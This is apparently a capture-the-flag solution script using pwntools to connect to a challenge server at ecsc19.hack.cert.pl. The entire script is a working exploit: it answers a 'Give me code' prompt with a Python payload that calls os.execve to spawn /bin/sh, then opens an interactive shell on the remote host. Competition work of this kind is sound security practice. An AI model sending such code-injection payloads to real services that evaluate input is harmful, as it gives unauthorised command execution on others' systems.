from pwn import *

p = remote('ecsc19.hack.cert.pl', 25011)
print p.recvuntil('Give me code:\n')
p.sendline('print(__import__(\'os\').execve(\'/bin/sh\', [\'/bin/sh\'], {\'PATH\': \'/\'}))')
p.interactive()
p.close()
